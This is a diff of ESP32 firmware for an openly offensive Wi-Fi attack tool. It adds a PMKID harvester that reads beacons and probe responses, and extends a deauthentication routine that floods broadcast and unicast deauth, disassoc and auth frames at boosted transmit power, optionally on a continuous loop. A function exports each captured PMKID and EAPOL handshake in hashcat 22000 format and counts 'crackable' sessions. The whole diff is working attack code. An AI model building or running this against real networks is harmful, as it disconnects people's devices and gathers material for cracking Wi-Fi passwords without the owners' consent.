+// ─── BEACON/PROBERESP PMKID SCANNER ─────────────────────────────────────────
+// Scans management frames for PMKID in RSN IE — higher hit rate
+// because some APs embed PMKID in beacons without requiring deauth.
+static void IRAM_ATTR parseMgmtForPMKID(const uint8_t* payload, uint16_t plen) {
+  if (plen < 36) return;
+  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)payload;
+  uint8_t subtype = (hdr->frame_ctrl >> 4) & 0x0F;
+  // 0x8 = Beacon, 0x5 = ProbeResp
+  if (subtype != 0x8 && subtype != 0x5) return;
+
+  const uint8_t* ap_mac = hdr->addr3;
+  if (g_filterTarget && !macZero(g_targetBSSID))
+    if (!macEq(ap_mac, g_targetBSSID)) return;
+
+  // Fixed fields after 802.11 header: Beacon=12, ProbeResp=12
+  const uint8_t* ies    = payload + 36;
+  uint16_t       ie_len = (plen > 36) ? plen - 36 : 0;
+  uint16_t       pos    = 0;
+
+  while (pos + 2 <= ie_len) {
+    uint8_t id   = ies[pos];
+    uint8_t len  = ies[pos + 1];
+    if (len == 0 || pos + 2 + len > ie_len) break;
+
+    // RSN IE (id=48) — look for PMKID list at the end
+    if (id == 48 && len >= 20) {
+      const uint8_t* rsn = ies + pos + 2;
+      uint16_t off = 2; // skip version
+      if (off + 4 <= len) {
+        off += 4; // skip group cipher suite
+        if (off + 2 <= len) {
+          uint16_t pairwise_cnt = (uint16_t)rsn[off] | ((uint16_t)rsn[off+1] << 8);
+          off += 2 + pairwise_cnt * 4;
+          if (off + 2 <= (uint16_t)len) {
+            uint16_t akm_cnt = (uint16_t)rsn[off] | ((uint16_t)rsn[off+1] << 8);
+            off += 2 + akm_cnt * 4;
+            if (off + 2 <= (uint16_t)len) {
+              off += 2; // skip RSN capabilities
+              if (off + 2 <= (uint16_t)len) {
+                uint16_t pmkid_cnt = (uint16_t)rsn[off] | ((uint16_t)rsn[off+1] << 8);
+                off += 2;
+                if (pmkid_cnt > 0 && off + 16 <= (uint16_t)len) {
+                  // PMKID found in beacon/probeResp
+                  uint8_t pmkid_buf[16];
+                  memcpy(pmkid_buf, rsn + off, 16);
+                  // Use a synthetic cli_mac = zeros (PMKID from beacon,
+                  // no client yet) — keyed per AP
+                  uint8_t zero_cli[6] = {0};
+                  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
+                    HsSession* s = findOrCreateSession(ap_mac, zero_cli);
+                    if (!s->pmkid) {
+                      memcpy(s->pmkid_bytes, pmkid_buf, 16);
+                      s->pmkid = true;
+                      char ab[18]; mac2str(ap_mac, ab);
+                      xSemaphoreGive(g_hsMutex);
+                      logEvent("PMKID from beacon!  AP:%s", ab);
+                      return;
+                    }
+                    xSemaphoreGive(g_hsMutex);
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+    pos += 2 + len;
+  }
 }
 
 // ─── PROMISCUOUS CALLBACK ────────────────────────────────────────────────────
@@ -477,35 +683,66 @@ void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
   uint16_t plen = pkt->rx_ctrl.sig_len;
   if (plen < 24) return;
 
-  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)pkt->payload;
-  uint8_t ftype = (hdr->frame_ctrl >> 2) & 0x03;
+  int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;
+  int    ch   = (int)pkt->rx_ctrl.channel;
 
-  appendFrame(pkt->payload, plen, g_targetChannel);
+  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)pkt->payload;
+  uint8_t ftype   = (hdr->frame_ctrl >> 2) & 0x03;
+  uint8_t subtype = (hdr->frame_ctrl >> 4) & 0x0F;
+
+  appendFrame(pkt->payload, plen, ch, rssi);
 
   if (ftype == 2) {  // Data frame
-    parseEAPOL(pkt->payload, plen, hdr->addr2, hdr->addr1);
+    // Track client: if toDS, addr2 = client
+    bool toDS   = (hdr->frame_ctrl >> 8) & 0x01;
+    bool fromDS = (hdr->frame_ctrl >> 9) & 0x01;
+    if (toDS && !fromDS && g_filterTarget && !macZero(g_targetBSSID)) {
+      if (macEq(hdr->addr1, g_targetBSSID) || macEq(hdr->addr3, g_targetBSSID)) {
+        trackClient(hdr->addr2, rssi);
+      }
+    }
+    parseEAPOL(pkt->payload, plen);
+  } else if (ftype == 0) {  // Management frame
+    parseMgmtForPMKID(pkt->payload, plen);
   }
 }
 
 // ─── PROMISC TASK ────────────────────────────────────────────────────────────
-// Waits on task notification from stopCapture() instead of busy-polling.
-// Stack: 2048 bytes is plenty since this task does almost nothing.
 void promisc_task(void* param) {
   INFO("Promisc sniffer up core %d ch %d", xPortGetCoreID(), g_targetChannel);
-  // Block indefinitely — stopCapture() sends ulTaskNotify to wake us
   ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
-  // Teardown
   esp_wifi_set_promiscuous_rx_cb(NULL);
   esp_wifi_set_promiscuous(false);
   g_promiscTask = NULL;
   vTaskDelete(NULL);
 }
 
+// ─── SPARKLINE UPDATE TASK ───────────────────────────────────────────────────
+void spark_task(void* param) {
+  while (true) {
+    vTaskDelay(pdMS_TO_TICKS(2000));
+    uint32_t cur = 0;
+    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+      cur = (uint32_t)g_capLen;
+      xSemaphoreGive(g_capMutex);
+    }
+    uint32_t delta = (cur >= g_sparkPrev) ? (cur - g_sparkPrev) : 0;
+    g_sparkPrev = cur;
+    if (g_sparkMutex && xSemaphoreTake(g_sparkMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+      g_sparkline[g_sparkHead] = delta;
+      g_sparkHead = (g_sparkHead + 1) % SPARK_LEN;
+      xSemaphoreGive(g_sparkMutex);
+    }
+  }
+}
+
+// ─── CAPTURE CONTROL ─────────────────────────────────────────────────────────
 void startCapture(int channel, const uint8_t* bssid, const char* ssid, bool filterBSSID) {
   if (g_promiscRunning) return;
 
   if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
-    g_capLen = 0;
+    g_capLen  = 0;
+    g_capFull = false;
     if (g_capBuf) {
       PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
       memcpy(g_capBuf, &gh, sizeof(gh));
@@ -515,8 +752,15 @@ void startCapture(int channel, const uint8_t* bssid, const char* ssid, bool filt
   }
 
   if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
-    memset(&g_hs, 0, sizeof(g_hs));
+    memset(g_sessions, 0, sizeof(g_sessions));
+    g_sessionCount = 0;
     xSemaphoreGive(g_hsMutex);
+  }
+
+  if (g_cliMutex && xSemaphoreTake(g_cliMutex, SEM_TIMEOUT) == pdTRUE) {
+    memset(g_clients, 0, sizeof(g_clients));
+    g_clientCount = 0;
+    xSemaphoreGive(g_cliMutex);
   }
 
   g_targetChannel = channel;
@@ -545,106 +789,163 @@ void startCapture(int channel, const uint8_t* bssid, const char* ssid, bool filt
 
 void stopCapture() {
   if (!g_promiscRunning) return;
-  g_capActive      = false;
-  g_promiscRunning = false;
-  g_promiscPaused  = false;
+  g_capActive = false;
 
-  // Wake the promisc task so it can clean up promiscuous mode itself
+  // Notify task first, then clear flag — avoids race
   if (g_promiscTask) {
     xTaskNotifyGive(g_promiscTask);
-    // Give it 100ms to tear down before we continue
-    vTaskDelay(pdMS_TO_TICKS(100));
+    vTaskDelay(pdMS_TO_TICKS(120));
   } else {
-    // Task was never created or already exited; clean up here
     esp_wifi_set_promiscuous_rx_cb(NULL);
     esp_wifi_set_promiscuous(false);
   }
 
-  // Restore AP channel
+  g_promiscRunning = false;
+  g_promiscPaused  = false;
+
   esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
   setLed(LS_GREEN);
-  logEvent("Capture stopped. Bytes=%u M1=%d M2=%d M3=%d M4=%d PMKID=%d",
-           (unsigned)g_capLen,
-           g_hs.m1?1:0, g_hs.m2?1:0, g_hs.m3?1:0, g_hs.m4?1:0, g_hs.pmkid?1:0);
+
+  int total_crackable = 0;
+  if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+    for (int i = 0; i < MAX_SESSIONS; i++) {
+      if (g_sessions[i].active &&
+          ((g_sessions[i].m1 && g_sessions[i].m2) || g_sessions[i].pmkid))
+        total_crackable++;
+    }
+    xSemaphoreGive(g_hsMutex);
+  }
+  logEvent("Capture stopped. Bytes=%u Sessions=%d Crackable=%d",
+           (unsigned)g_capLen, g_sessionCount, total_crackable);
 }
 
 // ─── DEAUTH TASK ─────────────────────────────────────────────────────────────
 void deauth_task(void* param) {
   char bstr[18]; mac2str(g_targetBSSID, bstr);
-  logEvent("Deauth: %s ch%d x%d bursts", bstr, g_targetChannel, g_deauthBursts);
+  char cbstr[18] = "broadcast";
+  if (!macZero(g_deauthClientMAC)) mac2str(g_deauthClientMAC, cbstr);
+  logEvent("Deauth: AP=%s CLI=%s ch%d x%d reason=%d",
+           bstr, cbstr, g_targetChannel, g_deauthBursts, g_deauthReason);
   setLed(LS_RED);
 
-  // Save promisc state — may not have been capturing when deauth was triggered
   bool wasCapturing = g_capActive;
   bool wasRunning   = g_promiscRunning;
+  uint32_t gap_us   = kGaps[g_deauthGapIdx < 3 ? g_deauthGapIdx : 1];
 
-  if (wasRunning) {
-    g_promiscPaused = true;
-    esp_wifi_set_promiscuous_rx_cb(NULL);
-    esp_wifi_set_promiscuous(false);
-    vTaskDelay(pdMS_TO_TICKS(5));
-  }
-
-  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-
-  // Deauth frame — reason 7 (Class 3 received)
-  uint8_t frame[26] = {};
-  frame[0] = 0xC0; frame[1] = 0x00;
-  frame[2] = 0x3A; frame[3] = 0x01;
-  memcpy(frame +  4, bcast,         6);
-  memcpy(frame + 10, g_targetBSSID, 6);
-  memcpy(frame + 16, g_targetBSSID, 6);
-  frame[24] = 0x07; frame[25] = 0x00;
-
-  // Disassoc frame — reason 8 (STA left BSS)
-  uint8_t disassoc[26]; memcpy(disassoc, frame, 26);
-  disassoc[0] = 0xA0;
-  disassoc[24] = 0x08;
-
-  // Auth frame — sends an unsolicited authentication to force re-association
-  // Some WPA3 APs and robust PMF-enabled APs ignore deauth-only floods;
-  // a broadcast auth triggers a fresh 4-way EAPOL handshake from scratch.
-  uint8_t auth[30] = {};
-  auth[0] = 0xB0; auth[1] = 0x00;       // Auth type
-  auth[2] = 0x3A; auth[3] = 0x01;       // duration
-  memcpy(auth +  4, bcast,         6);   // DA = broadcast
-  memcpy(auth + 10, g_targetBSSID, 6);   // SA = AP BSSID
-  memcpy(auth + 16, g_targetBSSID, 6);   // BSSID
-  auth[24] = 0x00; auth[25] = 0x00;     // Algorithm: open
-  auth[26] = 0x01; auth[27] = 0x00;     // Sequence: 1
-  auth[28] = 0x00; auth[29] = 0x00;     // Status: success
-
-  for (int burst = 0; burst < g_deauthBursts && g_deauthRunning; burst++) {
-    for (int i = 0; i < 10; i++) {      // 10 frames per burst (was 6)
-      esp_wifi_80211_tx(WIFI_IF_AP,  frame,    26, true);
-      esp_wifi_80211_tx(WIFI_IF_STA, frame,    26, true);
-      esp_wifi_80211_tx(WIFI_IF_AP,  disassoc, 26, true);
-      esp_wifi_80211_tx(WIFI_IF_STA, disassoc, 26, true);
-      esp_wifi_80211_tx(WIFI_IF_AP,  auth,     30, true);
-      esp_wifi_80211_tx(WIFI_IF_STA, auth,     30, true);
-      ets_delay_us(100);
+  do {
+    if (wasRunning) {
+      g_promiscPaused = true;
+      esp_wifi_set_promiscuous_rx_cb(NULL);
+      esp_wifi_set_promiscuous(false);
+      vTaskDelay(pdMS_TO_TICKS(5));
     }
-    vTaskDelay(pdMS_TO_TICKS(80));
-  }
 
-  // Restore promisc if it was active
-  if (wasRunning) {
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
-    g_promiscPaused = false;
-  }
+    // Boost TX power for deauth burst
+    esp_wifi_set_max_tx_power(MAX_TX_POWER);
+
+    const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    uint8_t reason_lo = g_deauthReason;
+    uint8_t reason_hi = 0x00;
+
+    // Deauth to broadcast
+    uint8_t frame_bc[26] = {};
+    frame_bc[0] = 0xC0; frame_bc[1] = 0x00;
+    frame_bc[2] = 0x3A; frame_bc[3] = 0x01;
+    memcpy(frame_bc +  4, bcast,         6);
+    memcpy(frame_bc + 10, g_targetBSSID, 6);
+    memcpy(frame_bc + 16, g_targetBSSID, 6);
+    frame_bc[24] = reason_lo; frame_bc[25] = reason_hi;
+
+    // Deauth unicast to specific client (if set)
+    uint8_t frame_uc[26] = {};
+    bool has_unicast = !macZero(g_deauthClientMAC);
+    if (has_unicast) {
+      memcpy(frame_uc, frame_bc, 26);
+      memcpy(frame_uc + 4, g_deauthClientMAC, 6);
+    }
+
+    // Disassoc broadcast
+    uint8_t disassoc[26];
+    memcpy(disassoc, frame_bc, 26);
+    disassoc[0]  = 0xA0;
+    disassoc[24] = 0x08;
+
+    // Disassoc unicast
+    uint8_t disassoc_uc[26];
+    if (has_unicast) {
+      memcpy(disassoc_uc, disassoc, 26);
+      memcpy(disassoc_uc + 4, g_deauthClientMAC, 6);
+    }
+
+    // Auth flood (forces fresh EAPOL exchange)
+    uint8_t auth[30] = {};
+    auth[0] = 0xB0; auth[1] = 0x00;
+    auth[2] = 0x3A; auth[3] = 0x01;
+    memcpy(auth +  4, bcast,         6);
+    memcpy(auth + 10, g_targetBSSID, 6);
+    memcpy(auth + 16, g_targetBSSID, 6);
+    auth[24] = 0x00; auth[25] = 0x00;
+    auth[26] = 0x01; auth[27] = 0x00;
+    auth[28] = 0x00; auth[29] = 0x00;
+
+    for (int burst = 0; burst < g_deauthBursts && g_deauthRunning; burst++) {
+      // Re-set channel every burst — handles band-steering APs
+      esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+
+      for (int i = 0; i < 10; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP,  frame_bc,   26, true);
+        esp_wifi_80211_tx(WIFI_IF_STA, frame_bc,   26, true);
+        if (has_unicast) {
+          esp_wifi_80211_tx(WIFI_IF_AP,  frame_uc, 26, true);
+          esp_wifi_80211_tx(WIFI_IF_STA, frame_uc, 26, true);
+        }
+        esp_wifi_80211_tx(WIFI_IF_AP,  disassoc,   26, true);
+        esp_wifi_80211_tx(WIFI_IF_STA, disassoc,   26, true);
+        if (has_unicast) {
+          esp_wifi_80211_tx(WIFI_IF_AP,  disassoc_uc, 26, true);
+          esp_wifi_80211_tx(WIFI_IF_STA, disassoc_uc, 26, true);
+        }
+        esp_wifi_80211_tx(WIFI_IF_AP,  auth,       30, true);
+        esp_wifi_80211_tx(WIFI_IF_STA, auth,       30, true);
+        ets_delay_us(gap_us);
+      }
+      vTaskDelay(pdMS_TO_TICKS(80));
+    }
+
+    // Restore promisc immediately after burst so capture resumes fast
+    if (wasRunning) {
+      esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
+      vTaskDelay(pdMS_TO_TICKS(5));
+      esp_wifi_set_promiscuous(true);
+      esp_wifi_set_promiscuous_rx_cb(promisc_cb);
+      g_promiscPaused = false;
+    } else {
+      esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
+    }
+
+    logEvent("Deauth burst done — listening for EAPOL...");
+
+    if (g_deauthCont && g_deauthRunning) {
+      // Wait interval before next round
+      uint32_t waited = 0;
+      while (waited < g_deauthInterval && g_deauthRunning) {
+        vTaskDelay(pdMS_TO_TICKS(200));
+        waited += 200;
+      }
+    }
+
+  } while (g_deauthCont && g_deauthRunning);
 
   g_deauthRunning = false;
   g_deauthTask    = NULL;
   setLed(wasCapturing ? LS_CYAN : LS_GREEN);
-  logEvent("Deauth burst done — waiting for EAPOL...");
   vTaskDelete(NULL);
 }
 
 // ─── SCAN TASK ───────────────────────────────────────────────────────────────
 void scan_task(void* param) {
   bool wasCapturing = g_capActive;
-  int  savedChannel = g_targetChannel;  // save before scan clobbers radio
+  int  savedChannel = g_targetChannel;
 
   if (wasCapturing) {
     g_capActive     = false;
@@ -656,9 +957,9 @@ void scan_task(void* param) {
 
   int n = WiFi.scanNetworks(false, true, false, 300);
 
-  // Restore to the right channel:
-  // If we were capturing on a target channel, go back there.
-  // Otherwise restore AP_CHANNEL so the management AP stays reachable.
+  // FIX: scanDelete before restoring promisc (v1.4 had race here)
+  WiFi.scanDelete();
+
   int restoreChannel = wasCapturing ? savedChannel : AP_CHANNEL;
   esp_wifi_set_channel(restoreChannel, WIFI_SECOND_CHAN_NONE);
   vTaskDelay(pdMS_TO_TICKS(20));
@@ -670,53 +971,62 @@ void scan_task(void* param) {
     esp_wifi_set_promiscuous_rx_cb(promisc_cb);
   }
 
-  // Build scan results HTML
+  // Pass 1: populate g_aps[] under mutex
+  int localCount = 0;
+  if (n > 0 && g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
+    g_apCount = (n > SCAN_MAX_APS) ? SCAN_MAX_APS : n;
+    localCount = g_apCount;
+    for (int i = 0; i < g_apCount; i++) {
+      uint8_t* bssid = WiFi.BSSID(i);
+      if (!bssid) { g_apCount--; i--; continue; }
+      strncpy(g_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
+      g_aps[i].ssid[32] = '\0';
+      memcpy(g_aps[i].bssid, bssid, 6);
+      g_aps[i].rssi    = WiFi.RSSI(i);
+      g_aps[i].channel = WiFi.channel(i);
+      g_aps[i].enc     = (int)WiFi.encryptionType(i);
+    }
+    localCount = g_apCount;
+    xSemaphoreGive(g_scanMutex);
+  }
+
+  // Pass 2: build HTML without mutex
   String html = "";
-  if (n <= 0) {
+  if (n <= 0 || localCount == 0) {
     html = "<tr><td colspan='7' style='text-align:center;color:#888;padding:20px'>No networks found</td></tr>";
   } else {
-    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
-      g_apCount = (n > SCAN_MAX_APS) ? SCAN_MAX_APS : n;
-      for (int i = 0; i < g_apCount; i++) {
-        uint8_t* bssid = WiFi.BSSID(i);
-        if (!bssid) { g_apCount--; i--; n--; continue; }
-        strncpy(g_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
-        g_aps[i].ssid[32] = '\0';
-        memcpy(g_aps[i].bssid, bssid, 6);
-        g_aps[i].rssi    = WiFi.RSSI(i);
-        g_aps[i].channel = WiFi.channel(i);
-        g_aps[i].enc     = (int)WiFi.encryptionType(i);
-      }
-      xSemaphoreGive(g_scanMutex);
-    }
-
-    for (int i = 0; i < n && i < SCAN_MAX_APS; i++) {
+    for (int i = 0; i < localCount; i++) {
       char bstr[18];
       mac2str(g_aps[i].bssid, bstr);
       int  rssi = g_aps[i].rssi;
       int  ch   = g_aps[i].channel;
 
-      // Full encryption label coverage
       const char* enc;
       switch (g_aps[i].enc) {
-        case WIFI_AUTH_OPEN:          enc = "Open";    break;
-        case WIFI_AUTH_WEP:           enc = "WEP";     break;
-        case WIFI_AUTH_WPA_PSK:       enc = "WPA";     break;
-        case WIFI_AUTH_WPA2_PSK:      enc = "WPA2";    break;
-        case WIFI_AUTH_WPA_WPA2_PSK:  enc = "WPA/2";   break;
-        case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2-E"; break;
-        case WIFI_AUTH_WPA3_PSK:      enc = "WPA3";    break;
-        case WIFI_AUTH_WPA2_WPA3_PSK: enc = "WPA2/3";  break;
-        case WIFI_AUTH_WAPI_PSK:      enc = "WAPI";    break;
-        case WIFI_AUTH_OWE:           enc = "OWE";     break;
-        default:                      enc = "WPA2";    break;
+        case WIFI_AUTH_OPEN:            enc = "Open";    break;
+        case WIFI_AUTH_WEP:             enc = "WEP";     break;
+        case WIFI_AUTH_WPA_PSK:         enc = "WPA";     break;
+        case WIFI_AUTH_WPA2_PSK:        enc = "WPA2";    break;
+        case WIFI_AUTH_WPA_WPA2_PSK:    enc = "WPA/2";   break;
+        case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2-E";  break;
+        case WIFI_AUTH_WPA3_PSK:        enc = "WPA3";    break;
+        case WIFI_AUTH_WPA2_WPA3_PSK:   enc = "WPA2/3";  break;
+        case WIFI_AUTH_WAPI_PSK:        enc = "WAPI";    break;
+        case WIFI_AUTH_OWE:             enc = "OWE";     break;
+        default:                        enc = "WPA2";    break;
       }
 
-      String col  = rssi > -50 ? "#0f9d58" : (rssi > -70 ? "#f4b400" : "#db4437");
-      String bars = rssi > -50 ? "▮▮▮▮" : (rssi > -60 ? "▮▮▮" : (rssi > -70 ? "▮▮" : "▮"));
+      // RSSI bar (5 levels) and signal color
+      int bars = rssi > -50 ? 5 : (rssi > -60 ? 4 : (rssi > -70 ? 3 : (rssi > -80 ? 2 : 1)));
+      String barHtml = "";
+      const char* barColors[] = {"#f85149","#da3633","#d29922","#3fb950","#2ea043"};
+      for (int b = 1; b <= 5; b++) {
+        int h = 4 + b * 3;
+        barHtml += "<span style='display:inline-block;width:4px;height:" + String(h) + "px;margin-right:1px;border-radius:1px;background:"
+                + String(b <= bars ? barColors[bars-1] : "#30363d") + ";vertical-align:bottom'></span>";
+      }
+      String col  = rssi > -50 ? "#3fb950" : (rssi > -70 ? "#d29922" : "#f85149");
       String disp = strlen(g_aps[i].ssid) ? String(g_aps[i].ssid) : "<i style='color:#888'>[Hidden]</i>";
-
-      // Escape order: backslash FIRST, then apostrophe (otherwise \' → \\')
       String ssidEsc = String(g_aps[i].ssid);
       ssidEsc.replace("\\", "\\\\");
       ssidEsc.replace("'",  "\\'");
@@ -724,85 +1034,86 @@ void scan_task(void* param) {
       html += "<tr>"
         "<td>" + String(i+1) + "</td>"
         "<td>" + disp + "</td>"
-        "<td style='font-family:monospace;font-size:11px'>" + String(bstr) + "</td>"
+        "<td class='mono'>" + String(bstr) + "</td>"
         "<td>" + ch + "</td>"
-        "<td style='color:" + col + "'>" + rssi + " " + bars + "</td>"
+        "<td>" + barHtml + " <span style='color:" + col + ";font-size:0.75rem'>" + rssi + "</span></td>"
         "<td>" + enc + "</td>"
         "<td><button class='btn-sel' onclick=\"selectTarget('" + String(bstr) + "'," + ch + ",'" + ssidEsc + "')\">Select</button></td>"
         "</tr>";
     }
   }
-  WiFi.scanDelete();
 
+  // Pass 3: store cache under mutex
   if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
     g_scanCache = html;
     xSemaphoreGive(g_scanMutex);
   }
-  // Atomic store — consistent with the CAS in /scan handler
   __atomic_store_n((bool*)&g_scanBusy, false, __ATOMIC_SEQ_CST);
-  logEvent("Scan done: %d APs", n > 0 ? n : 0);
+  logEvent("Scan done: %d APs", localCount);
   vTaskDelete(NULL);
 }
 
 // ─── HASHCAT 22000 BUILDER ────────────────────────────────────────────────────
+// Returns all crackable sessions — not just the first one.
 String build22000() {
   if (xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) != pdTRUE) return "";
-  HandshakeState hs = g_hs;
+  HsSession snap[MAX_SESSIONS];
+  memcpy(snap, g_sessions, sizeof(snap));
   xSemaphoreGive(g_hsMutex);
 
-  // Lookup-table hex helper — no per-byte snprintf
-  auto hexStr = [](const uint8_t* b, int len) -> String {
-    String s; s.reserve(len * 2);
-    char pair[3]; pair[2] = '\0';
-    for (int i = 0; i < len; i++) {
-      pair[0] = kHex[b[i] >> 4];
-      pair[1] = kHex[b[i] & 0xF];
-      s += pair;
-    }
-    return s;
-  };
-
-  char ap[13], cli[13];
-  snprintf(ap,  13, "%02x%02x%02x%02x%02x%02x",
-    hs.ap_mac[0],hs.ap_mac[1],hs.ap_mac[2],
-    hs.ap_mac[3],hs.ap_mac[4],hs.ap_mac[5]);
-  snprintf(cli, 13, "%02x%02x%02x%02x%02x%02x",
-    hs.cli_mac[0],hs.cli_mac[1],hs.cli_mac[2],
-    hs.cli_mac[3],hs.cli_mac[4],hs.cli_mac[5]);
-
-  // SSID → hex
-  char ssidHexBuf[65]; // max 32 bytes → 64 hex chars + NUL
-  int  ssidLen = 0;
-  while (g_targetSSID[ssidLen] && ssidLen < 32) ssidLen++;
+  int  ssidLen = strnlen(g_targetSSID, 32);
+  char ssidHexBuf[65];
   bytesToHex((const uint8_t*)g_targetSSID, ssidLen, ssidHexBuf);
-  String ssidHex = String(ssidHexBuf);
 
   String out = "";
 
-  if (hs.pmkid && !macZero(hs.ap_mac)) {
-    out += "WPA*01*";
-    out += hexStr(hs.pmkid_bytes, 16);
-    out += "*" + String(ap);
-    out += "*" + String(cli);
-    out += "*" + ssidHex;
-    out += "***\n";
-  }
+  for (int idx = 0; idx < MAX_SESSIONS; idx++) {
+    const HsSession& hs = snap[idx];
+    if (!hs.active) continue;
+    if (macZero(hs.ap_mac)) continue;
 
-  if (hs.m1 && hs.m2 && !macZero(hs.ap_mac)) {
-    uint8_t mic_data_copy[128];
-    memcpy(mic_data_copy, hs.mic_data, hs.mic_data_len);
-    if (hs.mic_data_len > EAPOL_MIC_OFFSET + 16)
-      memset(mic_data_copy + EAPOL_MIC_OFFSET, 0, 16);
+    char ap[13], cli[13];
+    snprintf(ap,  13, "%02x%02x%02x%02x%02x%02x",
+      hs.ap_mac[0],hs.ap_mac[1],hs.ap_mac[2],
+      hs.ap_mac[3],hs.ap_mac[4],hs.ap_mac[5]);
+    snprintf(cli, 13, "%02x%02x%02x%02x%02x%02x",
+      hs.cli_mac[0],hs.cli_mac[1],hs.cli_mac[2],
+      hs.cli_mac[3],hs.cli_mac[4],hs.cli_mac[5]);
 
-    out += "WPA*02*";
-    out += hexStr(hs.mic, 16);
-    out += "*" + String(ap);
-    out += "*" + String(cli);
-    out += "*" + ssidHex;
-    out += "*" + hexStr(hs.anonce, 32);
-    out += "*" + hexStr(mic_data_copy, hs.mic_data_len);
-    out += "*" + hexStr(hs.rsnie, hs.rsnie_len);
-    out += "*02\n";
+    char pmkidHexBuf[33], anonceHexBuf[65], micHexBuf[33];
+    char micDataHexBuf[257], rsnieHexBuf[129];
+
+    if (hs.pmkid) {
+      bytesToHex(hs.pmkid_bytes, 16, pmkidHexBuf);
+      out += "WPA*01*";
+      out += pmkidHexBuf;
+      out += "*"; out += ap;
+      out += "*"; out += cli;
+      out += "*"; out += ssidHexBuf;
+      out += "***\n";
+    }
+
+    if (hs.m1 && hs.m2 && hs.mic_valid) {
+      uint8_t mic_data_copy[128];
+      memcpy(mic_data_copy, hs.mic_data, hs.mic_data_len);
+      if (hs.mic_data_len > EAPOL_MIC_OFFSET + 16)
+        memset(mic_data_copy + EAPOL_MIC_OFFSET, 0, 16);
+
+      bytesToHex(hs.mic,        16,              micHexBuf);
+      bytesToHex(hs.anonce,     32,              anonceHexBuf);
+      bytesToHex(mic_data_copy, hs.mic_data_len, micDataHexBuf);
+      bytesToHex(hs.rsnie,      hs.rsnie_len,    rsnieHexBuf);
+
+      out += "WPA*02*";
+      out += micHexBuf;
+      out += "*"; out += ap;
+      out += "*"; out += cli;
+      out += "*"; out += ssidHexBuf;
+      out += "*"; out += anonceHexBuf;
+      out += "*"; out += micDataHexBuf;
+      out += "*"; out += rsnieHexBuf;
+      out += "*02\n";
+    }
   }
 
   if (out.length() == 0) out = "# No crackable handshake yet\n";
@@ -812,17 +1123,18 @@ String build22000() {
 // ─── JSON METADATA ────────────────────────────────────────────────────────────
 String buildJSON() {
   if (xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) != pdTRUE) return "{}";
-  HandshakeState hs = g_hs;
+  HsSession snap[MAX_SESSIONS];
+  int snapCount = g_sessionCount;
+  memcpy(snap, g_sessions, sizeof(snap));
   xSemaphoreGive(g_hsMutex);
 
-  char ap[18], cli[18];
-  mac2str(hs.ap_mac,  ap);
-  mac2str(hs.cli_mac, cli);
+  size_t capBytes = 0;
+  if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+    capBytes = g_capLen;
+    xSemaphoreGive(g_capMutex);
+  }
 
-  char pmkidHex[33] = "";
-  if (hs.pmkid) bytesToHex(hs.pmkid_bytes, 16, pmkidHex);
-
-  // Escape SSID for JSON: backslash, quote, control chars
+  // JSON-escape SSID
   char ssidEsc[132] = "";
   {
     int o = 0;
@@ -836,33 +1148,95 @@ String buildJSON() {
     ssidEsc[o] = '\0';
   }
 
-  // Snapshot capLen under mutex
-  size_t capBytes = 0;
-  if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
-    capBytes = g_capLen;
-    xSemaphoreGive(g_capMutex);
+  String out = "{\"ssid\":\"";
+  out += ssidEsc;
+  out += "\",\"channel\":";
+  out += g_targetChannel;
+  out += ",\"cap_bytes\":";
+  out += (unsigned)capBytes;
+  out += ",\"cap_full\":";
+  out += g_capFull ? "true" : "false";
+  out += ",\"capturing\":";
+  out += g_capActive ? "true" : "false";
+  out += ",\"heap_free\":";
+  out += (unsigned)ESP.getFreeHeap();
+  out += ",\"psram_free\":";
+  out += (unsigned)(psramFound() ? ESP.getFreePsram() : 0);
+  out += ",\"sessions\":[";
+
+  bool first = true;
+  for (int i = 0; i < MAX_SESSIONS; i++) {
+    const HsSession& s = snap[i];
+    if (!s.active) continue;
+    if (!first) out += ",";
+    first = false;
+
+    char ap[18], cli[18];
+    mac2str(s.ap_mac,  ap);
+    mac2str(s.cli_mac, cli);
+    char pmkidHex[33] = "";
+    if (s.pmkid) bytesToHex(s.pmkid_bytes, 16, pmkidHex);
